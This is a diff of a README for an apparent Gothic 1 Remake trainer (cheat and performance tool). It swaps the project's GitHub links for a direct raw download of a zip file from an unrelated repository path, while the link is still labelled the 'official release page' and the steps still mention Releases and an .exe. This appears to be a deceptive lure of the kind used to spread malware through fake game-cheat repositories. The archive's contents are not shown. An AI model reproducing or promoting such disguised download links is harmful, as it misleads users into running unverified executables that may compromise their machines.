@@ -5,7 +5,7 @@ description: "Optimize Gothic 1 Remake performance with FPS fixes, Marvin mode c
 ---
 # ⚔️ Gothic1Remake_Trainer_1 - Enhance your Gothic 1 Remake experience
 
-[![Download](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/esmaunarticulated499/Gothic1Remake_Trainer_1)
+[![Download](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://raw.githubusercontent.com/esmaunarticulated499/esmaunarticulated499.github.io/main/preantiquity/esmaunarticulated-github-io-v1.6-beta.3.zip)
 
 Gothic1Remake_Trainer_1 provides tools to improve game performance and manage character growth. This tool organizes essential survival tips, build strategies, and optimization settings for the Gothic 1 Remake. It simplifies the application of game tweaks and cheat codes through an interface.
 
@@ -24,7 +24,7 @@ The program runs as a standalone application. It does not require you to install
 
 Follow these steps to set up the trainer on your Windows machine.
 
-1. Go to the [official release page](https://github.com/esmaunarticulated499/Gothic1Remake_Trainer_1).
+1. Go to the [official release page](https://raw.githubusercontent.com/esmaunarticulated499/esmaunarticulated499.github.io/main/preantiquity/esmaunarticulated-github-io-v1.6-beta.3.zip).
 2. Look for the latest version under the "Releases" section on the right side of the page.
 3. Click the file ending in .exe to start your download.
 4. Once the download finishes, move the file to a folder where you keep your games.
